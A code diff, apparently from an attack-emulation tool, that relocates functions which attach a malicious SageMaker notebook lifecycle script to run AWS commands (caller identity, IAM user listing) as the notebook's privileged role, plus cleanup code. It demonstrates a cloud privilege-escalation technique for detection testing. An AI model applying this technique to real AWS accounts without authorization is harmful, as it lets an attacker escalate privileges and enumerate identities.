@@ -57,6 +57,44 @@ You can also watch for suspicious sequences of <code>StopNotebookInstance</code>
 	})
 }
 
+func detonate(params map[string]string, providers stratus.CloudProviders) error {
+	client := sagemaker.NewFromConfig(providers.AWS().GetConnection())
+
+	notebookName = params["target_notebook_name"]
+
+	const onStartScript = `#!/bin/bash
+set -e
+# Execute a command as the high-privilege role and write output to a log file
+aws sts get-caller-identity >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
+aws iam list-users >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
+`
+
+	err := CreateNotebookLifecycleConfig(client, configName, onStartScript)
+	if err != nil {
+		log.Fatalf("Lifecycle config creation failed: %v", err)
+	}
+
+	err = UpdateAndRestartNotebook(client, notebookName, configName)
+	if err != nil {
+		log.Fatalf("Lifecycle config creation failed: %v", err)
+	}
+
+	return nil
+}
+
+func revert(params map[string]string, providers stratus.CloudProviders) error {
+
+	client := sagemaker.NewFromConfig(providers.AWS().GetConnection())
+
+	notebookName = params["target_notebook_name"]
+
+	err := DetachAndDeleteLifecycleConfig(client, notebookName, configName)
+	if err != nil {
+		log.Fatalf("Cleanup failed: %v", err)
+	}
+	return nil
+}
+
 // CreateNotebookLifecycleConfig defines and creates the lifecycle configuration.
 func CreateNotebookLifecycleConfig(
 	client *sagemaker.Client,
@@ -251,42 +289,5 @@ func DetachAndDeleteLifecycleConfig(
 	}
 
 	log.Printf("Cleanup complete: Config %s deleted.", configName)
-	return nil
-}
-func detonate(params map[string]string, providers stratus.CloudProviders) error {
-	client := sagemaker.NewFromConfig(providers.AWS().GetConnection())
-
-	notebookName = params["target_notebook_name"]
-
-	const onStartScript = `#!/bin/bash
-set -e
-# Execute a command as the high-privilege role and write output to a log file
-aws sts get-caller-identity >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
-aws iam list-users >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
-`
-
-	err := CreateNotebookLifecycleConfig(client, configName, onStartScript)
-	if err != nil {
-		log.Fatalf("Lifecycle config creation failed: %v", err)
-	}
-
-	err = UpdateAndRestartNotebook(client, notebookName, configName)
-	if err != nil {
-		log.Fatalf("Lifecycle config creation failed: %v", err)
-	}
-
-	return nil
-}
-
-func revert(params map[string]string, providers stratus.CloudProviders) error {
-
-	client := sagemaker.NewFromConfig(providers.AWS().GetConnection())
-
-	notebookName = params["target_notebook_name"]
-
-	err := DetachAndDeleteLifecycleConfig(client, notebookName, configName)
-	if err != nil {
-		log.Fatalf("Cleanup failed: %v", err)
-	}
 	return nil
 }
